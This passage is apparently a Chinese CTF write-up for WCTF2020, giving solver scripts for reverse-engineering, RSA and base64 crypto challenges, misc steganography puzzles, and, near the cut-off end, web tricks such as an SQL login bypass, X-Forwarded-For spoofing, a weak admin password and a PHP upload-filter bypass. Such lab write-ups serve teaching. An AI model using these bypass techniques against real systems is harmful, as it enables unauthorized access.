0xd8, 0x2a, 0xda, 0x2d, 0xd7, 0x2c, 0xdc, 0xe1, 0xdb, 0x2c, 0xd9, 0xdd, 0x27, 0x2d, 0x2a, 0xdc, 0xdb, 0x2c, 0xe1, 0x29, 0xda, 0xda, 0x2c, 0xda, 0x2a, 0xd9, 0x29, 0x2a]</span><br><span class="line"></span><br><span class="line">ads &#x3D; 0x4005B0</span><br><span class="line">end &#x3D; 0x401DC0</span><br><span class="line">i &#x3D; PrevHead(end)</span><br><span class="line">while i &gt; ads:</span><br><span class="line">    if GetMnem(i) &#x3D;&#x3D; &#39;xor&#39; and GetOpnd(i, 0) &#x3D;&#x3D; &#39;byte ptr [rdx+rax+5]&#39;:</span><br><span class="line">        k &#x3D; int(GetOpnd(i, 1).rstrip(&#39;h&#39;), 16)</span><br><span class="line">        dt &#x3D; xor(dt, k)</span><br><span class="line">        print(&quot;xor: &#123;&#125;&quot;.format(k))</span><br><span class="line">    if GetMnem(i) &#x3D;&#x3D; &#39;add&#39; and GetOpnd(i, 0) &#x3D;&#x3D; &#39;byte ptr [rdx+rax+5]&#39;:</span><br><span class="line">        k &#x3D; int(GetOpnd(i, 1).rstrip(&#39;h&#39;), 16)</span><br><span class="line">        dt &#x3D; trans(dt, k)</span><br><span class="line">        print(&quot;trans: &#123;&#125;&quot;.format(k))</span><br><span class="line">    if GetMnem(i) &#x3D;&#x3D; &#39;not&#39; and GetOpnd(i, 0) &#x3D;&#x3D; &#39;byte ptr [rdx+rax+5]&#39;:</span><br><span class="line">        dt &#x3D; not_(dt)</span><br><span class="line">        print(&quot;not: &#123;&#125;&quot;.format(k))</span><br><span class="line">    i &#x3D; PrevHead(i)</span><br><span class="line"></span><br><span class="line">print(dt)</span><br></pre></td></tr></table></figure><p>解法三：符号执行工具约束求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">"./funre"</span>, load_options=&#123;<span class="string">"auto_load_libs"</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">f = p.factory</span><br><span class="line">state = f.entry_state(addr=<span class="number">0x400605</span>)</span><br><span class="line">flag = claripy.BVS(<span class="string">"flag"</span>, <span class="number">8</span>*<span class="number">32</span>)</span><br><span class="line">state.memory.store(<span class="number">0x603055</span>+<span class="number">0x300</span>+<span class="number">5</span>, flag)</span><br><span class="line">state.regs.rdx = <span class="number">0x603055</span>+<span class="number">0x300</span></span><br><span class="line">state.regs.rdi = <span class="number">0x603055</span>+<span class="number">0x300</span>+<span class="number">5</span></span><br><span class="line"></span><br><span class="line">sm = p.factory.simulation_manager(state)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[+] init ok"</span>)</span><br><span class="line"></span><br><span class="line">sm.explore(find=<span class="number">0x401DAE</span>)</span><br><span class="line"><span class="keyword">if</span> sm.found:</span><br><span class="line">    print(<span class="string">"[+] found!"</span>)</span><br><span class="line">    x = sm.found[<span class="number">0</span>].solver.eval(flag, cast_to=bytes)</span><br><span class="line">    print(x)</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/03/30/GnNG4g.png" alt="GnNG4g.png"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="大数运算-55-solves"><a href="#大数运算-55-solves" class="headerlink" title="大数运算 - 55 solves"></a>大数运算 - 55 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>题目：</p><blockquote><p>flag等于 wctf2020{Part1-Part2-Part3-Part4} 每一Part都为数的十六进制形式（不需要0x)，并用 ‘-‘ 连接<br>Part1 = <code>2020*2019*2018* ... *3*2*1</code> 的前8位<br>Part2 = <code>520^1314 + 2333^666</code> 的前8位<br>Part3 = 宇宙终极问题的答案 x, y, z绝对值和的前8位<br>Part4 = 见图片附件，计算结果乘上1314</p></blockquote><p><img src="https://s1.ax1x.com/2020/03/29/GVYCUs.jpg" alt="GVYCUs.jpg"></p><p>这个就是考察萌新的 Python 能力，直接用 Python 算就可以了。</p><p>贴一下exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># part1</span></span><br><span class="line">cnt = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">2021</span>):</span><br><span class="line">cnt *= i</span><br><span class="line">Part1 = str(hex(int(str(cnt)[:<span class="number">8</span>])))[<span class="number">2</span>:]</span><br><span class="line"><span class="comment"># 不要0x</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># part2</span></span><br><span class="line">cnt = <span class="number">520</span> ** <span class="number">1314</span> + <span class="number">2333</span> ** <span class="number">666</span></span><br><span class="line">Part2 = str(hex(int(str(cnt)[:<span class="number">8</span>])))[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># part3</span></span><br><span class="line"><span class="comment"># 宇宙终极问题的答案，Google一下前几条就有，取x, y, z</span></span><br><span class="line"><span class="comment"># 42 =（-80538738812075974）^3 + 80435758145817515^3 + 12602123297335631^3</span></span><br><span class="line">cnt = <span class="number">80538738812075974</span> + <span class="number">80435758145817515</span> + <span class="number">12602123297335631</span></span><br><span class="line">Part3 = str(hex(int(str(cnt)[:<span class="number">8</span>])))[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># part4</span></span><br><span class="line"><span class="comment"># 这是定积分，比较简单，图是嫖的，算出来结果是520(怎么那么多骚东西)</span></span><br><span class="line">cnt = <span class="number">520</span> * <span class="number">1314</span></span><br><span class="line">Part4 = str(hex(int(str(cnt)[:<span class="number">8</span>])))[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">'wctf2020&#123;%s-%s-%s-%s&#125;'</span> % (Part1, Part2, Part3, Part4)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="B-se-37-solves"><a href="#B-se-37-solves" class="headerlink" title="B@se - 37 solves"></a>B@se - 37 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>题目：</p><blockquote><p>JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs****kxyz012789+/</p><p>oh holy shit, something is missing…</p></blockquote><p>换表的 base64 太常见了，做了一点点改动，全排列就24种。</p><p>密文：</p><blockquote><p>MyLkTaP3FaA7KOWjTmKkVjWjVzKjdeNvTnAjoH9iZOIvTeHbvD==</p></blockquote><p>我用了 itertools 模块，exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 34uj</span></span><br><span class="line">string1 = <span class="string">"JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs****kxyz012789+/"</span></span><br><span class="line">string2 = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></span><br><span class="line"></span><br><span class="line">enc = <span class="string">'MyLkTaP3FaA7KOWjTmKkVjWjVzKjdeNvTnAjoH9iZOIvTeHbvD=='</span></span><br><span class="line"></span><br><span class="line">miss = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> string2:</span><br><span class="line"><span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> string1:</span><br><span class="line">miss.append(i)</span><br><span class="line"></span><br><span class="line">ob = itertools.permutations(miss, <span class="number">4</span>)</span><br><span class="line">tb = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ob:</span><br><span class="line">tmp = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">tmp += j</span><br><span class="line">tb.append(tmp)</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> tb:</span><br><span class="line">string1 = <span class="string">"JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs"</span> + x + <span class="string">"kxyz012789+/"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line"><span class="keyword">if</span> i != <span class="string">'='</span>:</span><br><span class="line">index = string1.find(i)</span><br><span class="line">flag += string2[index]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">flag += <span class="string">'='</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">flag = base64.b64decode(flag).decode()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'wctf2020'</span> <span class="keyword">in</span> flag:</span><br><span class="line">print(flag)</span><br><span class="line">flag = <span class="string">''</span></span><br></pre></td></tr></table></figure><p>跑出来有一些是不可见字符，有一些是不怎么对的，但可见字符就两种情况，flag 是有意义的英文单词，所以找那个最像的就可以。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wctf2020&#123;bare64_!r_v2ry_e@ry_and_fuN&#125;</span><br><span class="line">wctf2020&#123;base64_1s_v3ry_e@sy_and_fuN&#125;</span><br><span class="line">wctf2020&#123;bare64_!r_v2ry_e@ry_and_fuN&#125;</span><br><span class="line">wctf2020&#123;base64_1s_v3ry_e@sy_and_fuN&#125;</span><br><span class="line">[Finished <span class="keyword">in</span> <span class="number">0.2</span>s]</span><br></pre></td></tr></table></figure><p>正解： <code>wctf2020{base64_1s_v3ry_e@sy_and_fuN}</code></p><h2 id="情书-32-solves"><a href="#情书-32-solves" class="headerlink" title="情书 - 32 solves"></a>情书 - 32 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>题目：</p><blockquote><p>Premise: Enumerate the alphabet by 0、1、2、…..  、25<br>Using the RSA system<br>Encryption:0156 0821 1616 0041 0140 2130 1616 0793<br>Public Key:2537 and 13<br>Private Key:2537 and 937</p><p>flag: wctf2020{Decryption}</p></blockquote><p>其实这题严格意义上也不是我出的，是朋友的男朋友之前纪念日给她的，然后求助于我来解，觉得挺有意思的就直接嫖过来了。</p><p>其实这个也有猜得出来的嫌疑，不过得搞清楚它的格式，算是非 CTFer 的脑回路吧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env</span></span><br><span class="line">d = <span class="number">937</span></span><br><span class="line">e = <span class="number">13</span></span><br><span class="line">n = <span class="number">2537</span></span><br><span class="line"></span><br><span class="line">al = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line"></span><br><span class="line">enc = [<span class="number">156</span>, <span class="number">821</span>, <span class="number">1616</span>, <span class="number">41</span>, <span class="number">140</span>, <span class="number">2130</span>, <span class="number">1616</span>, <span class="number">793</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">result = pow(i, d, n)</span><br><span class="line">flag += al[result%<span class="number">26</span>]</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment"># flag = iloveu</span></span><br></pre></td></tr></table></figure><p>其实是有点坑的。。。希望不要打我</p><h2 id="佛说：只能四天-19-solves"><a href="#佛说：只能四天-19-solves" class="headerlink" title="佛说：只能四天 - 19 solves"></a>佛说：只能四天 - 19 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>标题源于微博的梗，重点在佛。</p><p>题目：</p><blockquote><p>圣经分为《旧约全书》和《新约全书》</p><p>hint1: 虽然有点不环保，但hint好像是一次性的，得到后就没有利用价值了。</p><p>hint2: 凯撒不是最后一步，by the way，凯撒为什么叫做凯撒？</p></blockquote><p>题目表述可以知道有新约与佛论禅，link：<code>http://hi.pcmoe.net/buddha.html</code></p><p>解出来全是社会主义核心价值观，link：<code>http://z.duoluosb.com/</code></p><p>再解就是 <code>RLJDQTOVPTQ6O6duws5CD6IB5B52CC57okCaUUC3SO4OSOWG3LynarAVGRZSJRAEYEZ_ooe_doyouknowfence</code>，后面有提示 fence，也就是栅栏密码了，这里设置是栅栏4位，根据 hint1 也可以知道 <code>_doyouknowfence</code> 这一段不用放进栅栏。</p><p>解完就是 <code>R5UALCUVJDCGD63RQISZTBOSO54JVBORP5SAT2OEQCWY6CGEO53Z67L_doyouknowCaesar</code>，提示凯撒，凯撒密码最广的是移位3位，很多在线解码器默认也是3位，所以这里也是3位移位。</p><p>最后得到 <code>O5RXIZRSGAZDA63ONFPWQYLPL54GSYLOM5PXQ2LBNZTV6ZDBL53W67I</code>，全是大写字母，容易想到(才怪)base32，解一下就可以得到flag了。</p><p>flag: <code>wctf2020{ni_hao_xiang_xiang_da_wo}</code></p><p>出题人又是藏在床底下的一天。。。。。</p><h2 id="babyrsa-35-solves"><a href="#babyrsa-35-solves" class="headerlink" title="babyrsa - 35 solves"></a>babyrsa - 35 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>基本做过rsa的题目都懂，也是让萌新学的，题目：</p><blockquote><p>c = 28767758880940662779934612526152562406674613203406706867456395986985664083182<br>n = 73069886771625642807435783661014062604264768481735145873508846925735521695159<br>e = 65537</p></blockquote><p>给出了，n，e，c，而且n很小，拿去 <a href="http://www.factordb.com/" target="_blank" rel="noopener">http://www.factordb.com/</a> 解一下就可以得到 p，q，接下来就是常规解法了。</p><p>这是 exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">73069886771625642807435783661014062604264768481735145873508846925735521695159</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">386123125371923651191219869811293586459</span></span><br><span class="line">q = <span class="number">189239861511125143212536989589123569301</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(libnum.n2s(m))</span><br><span class="line"><span class="comment"># wctf2020&#123;just_@_piece_0f_cak3&#125;</span></span><br></pre></td></tr></table></figure><p>萌新们要是碰到模块安装的问题也可以去我博客翻翻，闲得没事干的时候整理的。</p><h2 id="leak-16-solves"><a href="#leak-16-solves" class="headerlink" title="leak - 16 solves"></a>leak - 16 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>这题是 dp 泄露，题目：</p><blockquote><p>e = 65537<br>n = 156808343598578774957375696815188980682166740609302831099696492068246337198792510898818496239166339015207305102101431634283168544492984586566799996471150252382144148257236707247267506165670877506370253127695314163987084076462560095456635833650720606337852199362362120808707925913897956527780930423574343287847<br>c = 108542078809057774666748066235473292495343753790443966020636060807418393737258696352569345621488958094856305865603100885838672591764072157183336139243588435583104423268921439473113244493821692560960443688048994557463526099985303667243623711454841573922233051289561865599722004107134302070301237345400354257869<br>dp = 734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825</p></blockquote><p>具体原理可以参考一下 <a href="https://www.dazhuanlan.com/2019/10/04/5d970ff4a37c5/" target="_blank" rel="noopener">RSA常见攻击方法</a>，<a href="https://www.jianshu.com/p/74270dc7a14b" target="_blank" rel="noopener">RSA之拒绝套路</a></p><p>这里只给 exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">156808343598578774957375696815188980682166740609302831099696492068246337198792510898818496239166339015207305102101431634283168544492984586566799996471150252382144148257236707247267506165670877506370253127695314163987084076462560095456635833650720606337852199362362120808707925913897956527780930423574343287847</span></span><br><span class="line">c = <span class="number">108542078809057774666748066235473292495343753790443966020636060807418393737258696352569345621488958094856305865603100885838672591764072157183336139243588435583104423268921439473113244493821692560960443688048994557463526099985303667243623711454841573922233051289561865599722004107134302070301237345400354257869</span></span><br><span class="line">dp = <span class="number">734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, e):</span><br><span class="line"><span class="keyword">if</span> (dp*e<span class="number">-1</span>) % i == <span class="number">0</span>:</span><br><span class="line">p = (dp*e<span class="number">-1</span>)//i + <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">q = n // p</span><br><span class="line">d = gmpy2.invert(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(libnum.n2s(m))</span><br><span class="line">exit()</span><br><span class="line"><span class="comment"># wctf2020&#123;dp_leaking_1s_very_d@angerous&#125;</span></span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="比赛规则-149-solves"><a href="#比赛规则-149-solves" class="headerlink" title="比赛规则 - 149 solves"></a>比赛规则 - 149 solves</h2><p>看规则交 flag，网页直接复制，不多说。</p><h2 id="Welcome-51-solves"><a href="#Welcome-51-solves" class="headerlink" title="Welcome - 51 solves"></a>Welcome - 51 solves</h2><p>题目：</p><blockquote><p>《论语》：三人行，必有我师焉。</p></blockquote><p>这是2019年国赛的签到题，提取出来改个flag。题目提示是三人行，所以三个人头就能拿flag了。当然出题人在测试的时手机打开两个人头一起来测试就可以。。。当然，其实只要是个圆形就能识别。后来又出现了空气中突然出现个圆，细思极恐。。</p><p>看了一些选手 wp 的各种截图，比如拿 tfboys 的，一个人头三个圈的。。。出题人要笑岔气了哈哈哈哈哈哈</p><h2 id="Space-Club-57-solves"><a href="#Space-Club-57-solves" class="headerlink" title="Space Club - 57 solves"></a>Space Club - 57 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>这个算是比较常规的 misc 了，txt 里全是空格，但是长度不一样，ctrl + A 就是惊喜，那我们猜测代表为0，1。</p><p>接下来脚本一跑，什么都有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">binary = []</span><br><span class="line">tmp = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> open(<span class="string">"space.txt"</span>, <span class="string">"r"</span>).readlines():</span><br><span class="line"><span class="keyword">if</span> len(x.strip(<span class="string">'\n'</span>)) == <span class="number">6</span>:</span><br><span class="line">tmp += <span class="string">'0'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">tmp += <span class="string">'1'</span></span><br><span class="line"><span class="keyword">if</span> len(tmp) == <span class="number">8</span>:</span><br><span class="line">binary.append(tmp)</span><br><span class="line">tmp = <span class="string">''</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> binary:</span><br><span class="line">flag += libnum.b2s(i)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment"># wctf2020&#123;h3re_1s_y0ur_fl@g_s1x_s1x_s1x&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Shop-18-solves"><a href="#Shop-18-solves" class="headerlink" title="Shop - 18 solves"></a>Shop - 18 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p><img src="https://s1.ax1x.com/2020/03/30/GuCnK0.jpg" alt="GuCnK0.jpg"></p><p>这题其实是 picoCTF 2019 魔改过来的题，考察点是<strong>整数溢出</strong>，本来想着放个 hint 说一说是32位还是64，但是大家都很强。。。全都秒了，不过随便输入123456789也完事了，这里是 int 32。</p><p><img src="https://s1.ax1x.com/2020/03/30/GuCevq.jpg" alt="GuCevq.jpg"></p><p>占4个字节  -2147483648 ~ 2147483647。</p><p>有钱就买买买：</p><p><img src="https://s1.ax1x.com/2020/03/30/GuCZ2n.jpg" alt="GuCZ2n.jpg"></p><h2 id="find-me-30-solves"><a href="#find-me-30-solves" class="headerlink" title="find me - 30 solves"></a>find me - 30 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>这题是我最初打CTF时在属性里找到flag，本来想用来做签到的(怎么全部是签到)，但是看大家做得好猛，就随便找了个盲文在线网站丢进去了。。。</p><p>解题思路：右键 -&gt; 属性 -&gt; 详细信息，把盲文复制，在线工具跑，得flag。</p><p>参考工具：<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen" target="_blank" rel="noopener">link</a></p><h2 id="girlfriend-24-solves"><a href="#girlfriend-24-solves" class="headerlink" title="girlfriend - 24 solves"></a>girlfriend - 24 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>这题原本我是想用拨号键弹奏千里之外，让大家把数字弄出来base64一下，但好像非常憨，为了不被打，改成了九键键盘。很多师傅一开始联想到了 Morse，好像也有点道理。。。</p><p>我想起来以前刚开始打CTF的时候，跟学长打俄罗斯的比赛，我硬是听了一晚上没听出来，后知后觉才发现有 <code>dtmf-decoder</code>这种东西。</p><p>这里跑一遍就可以得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">999*666*88*2*777*33*6*999*4*444*777*555*333*777*444*33*66*3*7777</span><br></pre></td></tr></table></figure><p>按的时候用 * 分隔了一下，对着键盘看一下就完事了。</p><p><img src="https://s1.ax1x.com/2020/03/30/GnaR76.png" alt="GnaR76.png"></p><p>参考工具在 Gayhub 上搜 dtmf 第一个就是，环境是 Python2</p><p>写脚本把数字替换成字母也很方便，这里不写了。（懒</p><h2 id="Alison-likes-jojo-13-solves"><a href="#Alison-likes-jojo-13-solves" class="headerlink" title="Alison likes jojo - 13 solves"></a>Alison likes jojo - 13 solves</h2><blockquote><p>Author: Alison</p></blockquote><p>Alison 大腿子友情出的题目，还是去年给我的，连饭都没吃，我可感动了。</p><p>打开压缩包我们可以看到两张图片，先 binwalk 一下第一张图片</p><p><img src="https://s1.ax1x.com/2020/03/30/GndPun.jpg" alt="GndPun.jpg"></p><p>有一个压缩包，这里我用 foremost 分离</p><p><img src="https://s1.ax1x.com/2020/03/30/GnddKA.jpg" alt="GnddKA.jpg"></p><p>进去发现压缩包，解压要密码，用 fcrackzip 跑一下kali自带的rockyou字典，几秒就出来了</p><p><img src="https://s1.ax1x.com/2020/03/30/Gnd9js.jpg" alt="Gnd9js.jpg"></p><p>解压之后发现有个txt，base64几下就可以得到 <code>killerqueen</code>，不知道有什么用，但给出来一定有用，另一个图片是 jpg，所以我们可以尝试与 jpg 有关的隐写工具，这里是 <code>outguess</code>。之前得到的就是key，提取出来就是flag。</p><p><img src="https://s1.ax1x.com/2020/03/30/Gndpcj.jpg" alt="Gndpcj.jpg"></p><h2 id="爬-31-solves"><a href="#爬-31-solves" class="headerlink" title="爬 - 31 solves"></a>爬 - 31 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>又是一个送分题，我doc把flag放进图片的底部然后转成pdf。预期解是用Photoshop打开可以看到另一张图，不过wps或者其它可以编辑pdf的软件打开直接把图片移开也是可以的。。。这里就不多说了。</p><h2 id="调查问卷-58-solves"><a href="#调查问卷-58-solves" class="headerlink" title="调查问卷 - 58 solves"></a>调查问卷 - 58 solves</h2><p>填问卷得分，Google的问卷需要科学上网一下。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="checkin-90-solves"><a href="#checkin-90-solves" class="headerlink" title="checkin - 90 solves"></a>checkin - 90 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>打开界面问作者，作者在题目都会说明，输入栏限制了最长3个，按钮又不让你按，于是改前端：</p><p><img src="https://s1.ax1x.com/2020/03/30/GnWzX6.png" alt="GnWzX6.png"></p><p>然后弹出一个框框，提示为远古的博客（博客托管在 GitHub，刚好Github比赛前一天又出事了，一度焦虑）</p><p><img src="https://s1.ax1x.com/2020/03/30/GnWx6x.png" alt="GnWx6x.png"></p><p>进去看看，在主页就有一半的 flag</p><p><img src="https://s1.ax1x.com/2020/03/30/Gnf90O.png" alt="Gnf90O.png"></p><p>这里有一个小心机，第一次看的时候肯定以为没有放全，等反应过来的时候开始回删了，所以得审前端或者再等一遍（逃</p><p>然后远古的博客，灵感来自于 ctfhub 的彩蛋题，文章是按时间排序的，那么翻到最后一页发现有个 1970 年的博客，文章底部就有另一半的 flag，这个就是签到题，我想了最久的一道题。</p><p>ps：那篇文章很有意义，可以看看，嘻嘻。</p><h2 id="admin-70-solves"><a href="#admin-70-solves" class="headerlink" title="admin - 70 solves"></a>admin - 70 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p><strong>login as admin</strong></p><p>这题一开始万能密码就能拿flag，后来觉得太简单了，加点基础内容，登录框首先万能密码就能绕过，当然弱口令也可以，admin/admin123456，不过不建议爆破。。。好几次都打down了。</p><p><strong>本地ip</strong></p><p>加 xff 头部就可以绕过了：<code>X-Forwarded-For:127.0.0.1</code>，用一些浏览器插件就可以解决了，Hackbar 也可以 add header</p><p>接下来 GET 传参 <code>ais=520</code> 和 POST 传参 <code>wust=1314</code> 就可以了，最后拿到一个被分解的 url，是 paste.ubuntu 网站的一个粘贴代码的地方，相信新生学c语言的时候没少用。。。所以很容易猜出来，又是排列组合，最多6次，去到网站后得到一串base64，解码得flag</p><h2 id="CV-Maker-43-solves"><a href="#CV-Maker-43-solves" class="headerlink" title="CV Maker - 43 solves"></a>CV Maker - 43 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>这题其实是有点问题，代码写得不太好，一开始在纠结过滤 <code>ph</code> 还是 <code>htaccess</code>，就先都写上去，结果最后忘了删。。。最后直接php就能上传了，谢谢 